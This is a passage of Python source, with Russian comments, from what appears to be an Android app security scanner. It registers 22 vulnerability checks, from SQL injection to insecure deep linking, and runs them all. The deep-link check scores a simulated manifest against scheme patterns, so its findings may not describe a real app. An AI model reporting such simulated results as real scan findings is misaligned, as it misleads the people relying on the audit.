            # Check for deep link security issues
            security_patterns = [
                "http://", "file://", "content://",
                "no scheme restriction", "wildcard",
                "unrestricted", "open redirect"
            ]
            
            for pattern in security_patterns:
                if pattern in simulated_manifest.lower():
                    security_issues = True
                    break
            
            factors.append({
                "name": "Deep Link Security",
                "passed": security_issues,
                "reason": "Deep link security issues detected" if security_issues else "Deep link security adequate"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Insecure deep linking detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "schemes_found": deep_link_schemes
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))


# ============================================================================
# ВЕКТОР РЕГИСТРАЦИЯ И ФУНКЦИИ
# ============================================================================

def get_application_security_vectors() -> Dict[int, Dict[str, Any]]:
    """
    Получение всех векторов безопасности приложений.
    
    Returns:
        Словарь с информацией о всех векторах
    """
    vectors = {}
    
    # Vector 220: SQL Injection
    vectors[220] = {
        "id": 220,
        "category": "A",  # Application Security
        "name": "SQL Injection",
        "description": "Проверка SQL injection уязвимостей",
        "check_functions": [
            "check_sql_injection"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["injection", "sql", "database"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 221: NoSQL Injection
    vectors[221] = {
        "id": 221,
        "category": "A",
        "name": "NoSQL Injection",
        "description": "Проверка NoSQL injection уязвимостей",
        "check_functions": [
            "check_nosql_injection"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["injection", "nosql", "mongodb"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 222: LDAP Injection
    vectors[222] = {
        "id": 222,
        "category": "A",
        "name": "LDAP Injection",
        "description": "Проверка LDAP injection уязвимостей",
        "check_functions": [
            "check_ldap_injection"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["injection", "ldap", "directory"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 223: OS Command Injection
    vectors[223] = {
        "id": 223,
        "category": "A",
        "name": "OS Command Injection",
        "description": "Проверка OS command injection уязвимостей",
        "check_functions": [
            "check_os_command_injection"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["injection", "command", "os"],
        "severity": "CRITICAL",
        "check_count": 5,
    }
    
    # Vector 224: Expression Language Injection
    vectors[224] = {
        "id": 224,
        "category": "A",
        "name": "Expression Language Injection",
        "description": "Проверка EL injection уязвимостей",
        "check_functions": [
            "check_expression_language_injection"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["injection", "el", "expression"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 225: Path Traversal
    vectors[225] = {
        "id": 225,
        "category": "A",
        "name": "Path Traversal",
        "description": "Проверка path traversal уязвимостей",
        "check_functions": [
            "check_path_traversal"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["traversal", "path", "file"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 226: Arbitrary File Upload
    vectors[226] = {
        "id": 226,
        "category": "A",
        "name": "Arbitrary File Upload",
        "description": "Проверка arbitrary file upload уязвимостей",
        "check_functions": [
            "check_arbitrary_file_upload"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["upload", "file", "rce"],
        "severity": "CRITICAL",
        "check_count": 5,
    }
    
    # Vector 227: Symlink Attack
    vectors[227] = {
        "id": 227,
        "category": "A",
        "name": "Symlink Attack",
        "description": "Проверка symlink attack уязвимостей",
        "check_functions": [
            "check_symlink_attack"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["symlink", "file", "privilege"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 228: Insecure Local Storage
    vectors[228] = {
        "id": 228,
        "category": "A",
        "name": "Insecure Local Storage",
        "description": "Проверка insecure local storage",
        "check_functions": [
            "check_insecure_local_storage"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["storage", "local", "encryption"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 229: Insecure Logging
    vectors[229] = {
        "id": 229,
        "category": "A",
        "name": "Insecure Logging",
        "description": "Проверка insecure logging practices",
        "check_functions": [
            "check_insecure_logging"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["logging", "pii", "security"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 230: Cache Poisoning
    vectors[230] = {
        "id": 230,
        "category": "A",
        "name": "Cache Poisoning",
        "description": "Проверка cache poisoning уязвимостей",
        "check_functions": [
            "check_cache_poisoning"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["cache", "poisoning", "web"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 231: Exported Content Providers
    vectors[231] = {
        "id": 231,
        "category": "A",
        "name": "Exported Content Providers",
        "description": "Проверка exported content providers",
        "check_functions": [
            "check_exported_content_providers"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["android", "provider", "exported"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 232: Exported Activities
    vectors[232] = {
        "id": 232,
        "category": "A",
        "name": "Exported Activities",
        "description": "Проверка exported activities",
        "check_functions": [
            "check_exported_activities"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["android", "activity", "exported"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 233: Exported Broadcast Receivers
    vectors[233] = {
        "id": 233,
        "category": "A",
        "name": "Exported Broadcast Receivers",
        "description": "Проверка exported broadcast receivers",
        "check_functions": [
            "check_exported_broadcast_receivers"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["android", "receiver", "broadcast"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 234: Insecure Intent Filters
    vectors[234] = {
        "id": 234,
        "category": "A",
        "name": "Insecure Intent Filters",
        "description": "Проверка insecure intent filters",
        "check_functions": [
            "check_insecure_intent_filters"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["android", "intent", "filter"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 235: WebView JavaScript Insecure
    vectors[235] = {
        "id": 235,
        "category": "A",
        "name": "WebView JavaScript Insecure",
        "description": "Проверка insecure WebView JavaScript usage",
        "check_functions": [
            "check_webview_javascript_insecure"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["webview", "javascript", "xss"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 236: WebView Exposed Java Objects
    vectors[236] = {
        "id": 236,
        "category": "A",
        "name": "WebView Exposed Java Objects",
        "description": "Проверка exposed Java objects in WebView",
        "check_functions": [
            "check_webview_exposed_java_objects"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["webview", "java", "interface"],
        "severity": "CRITICAL",
        "check_count": 5,
    }
    
    # Vector 237: Old WebKit Version
    vectors[237] = {
        "id": 237,
        "category": "A",
        "name": "Old WebKit Version",
        "description": "Проверка old WebKit version",
        "check_functions": [
            "check_old_webkit_version"
        ],
        "requires_adb": False,
        "requires_network": True,
        "priority": 1,
        "depends_on": [],
        "tags": ["webkit", "version", "cve"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 238: Unsafe Reflection
    vectors[238] = {
        "id": 238,
        "category": "A",
        "name": "Unsafe Reflection",
        "description": "Проверка unsafe reflection usage",
        "check_functions": [
            "check_unsafe_reflection"
        ],
        "requires_adb": False,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["reflection", "dynamic", "rce"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    # Vector 239: Dynamic Code Loading
    vectors[239] = {
        "id": 239,
        "category": "A",
        "name": "Dynamic Code Loading",
        "description": "Проверка dynamic code loading",
        "check_functions": [
            "check_dynamic_code_loading"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["dynamic", "loading", "dex"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 240: Java Deserialization
    vectors[240] = {
        "id": 240,
        "category": "A",
        "name": "Java Deserialization",
        "description": "Проверка Java deserialization vulnerabilities",
        "check_functions": [
            "check_java_deserialization"
        ],
        "requires_adb": False,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["serialization", "deserialization", "rce"],
        "severity": "HIGH",
        "check_count": 5,
    }
    
    # Vector 241: Insecure Deep Linking
    vectors[241] = {
        "id": 241,
        "category": "A",
        "name": "Insecure Deep Linking",
        "description": "Проверка insecure deep linking",
        "check_functions": [
            "check_insecure_deep_linking"
        ],
        "requires_adb": True,
        "requires_network": False,
        "priority": 1,
        "depends_on": [],
        "tags": ["deep", "linking", "android"],
        "severity": "MEDIUM",
        "check_count": 5,
    }
    
    return vectors


def scan_application_security_vectors(config: Optional[ScanConfig] = None, adb: Optional[ADBConnector] = None) -> Dict[str, Any]:
    """
    Сканирование всех векторов безопасности приложений.
    
    Args:
        config: Конфигурация сканирования
        adb: ADB connector
        
    Returns:
        Результаты сканирования всех векторов
    """
    vectors = ApplicationSecurityVectors(config, adb)
    results = {}
    
    # SQL Injection vectors
    results["sql_injection"] = vectors.check_sql_injection()
    results["nosql_injection"] = vectors.check_nosql_injection()
    results["ldap_injection"] = vectors.check_ldap_injection()
    results["os_command_injection"] = vectors.check_os_command_injection()
    results["expression_language_injection"] = vectors.check_expression_language_injection()
    
    # Traversal vectors
    results["path_traversal"] = vectors.check_path_traversal()
    results["arbitrary_file_upload"] = vectors.check_arbitrary_file_upload()
    results["symlink_attack"] = vectors.check_symlink_attack()
    
    # Storage vectors
    results["insecure_local_storage"] = vectors.check_insecure_local_storage()
    results["insecure_logging"] = vectors.check_insecure_logging()
    results["cache_poisoning"] = vectors.check_cache_poisoning()
    
    # Intent vectors
    results["exported_content_providers"] = vectors.check_exported_content_providers()
    results["exported_activities"] = vectors.check_exported_activities()
    results["exported_broadcast_receivers"] = vectors.check_exported_broadcast_receivers()
    results["insecure_intent_filters"] = vectors.check_insecure_intent_filters()
    
    # WebView vectors
    results["webview_javascript_insecure"] = vectors.check_webview_javascript_insecure()
    results["webview_exposed_java_objects"] = vectors.check_webview_exposed_java_objects()
    results["old_webkit_version"] = vectors.check_old_webkit_version()
    
    # Dynamic code vectors
    results["unsafe_reflection"] = vectors.check_unsafe_reflection()
    results["dynamic_code_loading"] = vectors.check_dynamic_code_loading()
    results["java_deserialization"] = vectors.check_java_deserialization()
    
    # Deep linking vector
    results["insecure_deep_linking"] = vectors.check_insecure_deep_linking()
    
    return results


def get_vector_count() -> int:
    """
    Получение количества реализованных векторов безопасности приложений.
    
    Returns:
        Количество векторов (22)
    """
    return 22


def get_vector_categories() -> Dict[str, List[str]]:
    """
    Получение категорий векторов безопасности приложений.
    
    Returns:
        dict с категориями и списками векторов
    """
    return {
        "injections": [
            "SQL Injection", "NoSQL Injection", "LDAP Injection",
            "OS Command Injection", "Expression Language Injection"
        ],
        "traversal": [
            "Path Traversal", "Arbitrary File Upload", "Symlink Attack"
        ],
        "storage": [
            "Insecure Local Storage", "Insecure Logging", "Cache Poisoning"
        ],
        "intent": [
            "Exported Content Providers", "Exported Activities",
            "Exported Broadcast Receivers", "Insecure Intent Filters"
        ],
        "webview": [
            "WebView JavaScript Insecure", "WebView Exposed Java Objects",
            "Old WebKit Version"
        ],
        "dynamic_code": [
            "Unsafe Reflection", "Dynamic Code Loading", "Java Deserialization"
        ],
        "deep_linking": [
            "Insecure Deep Linking"
        ]
    }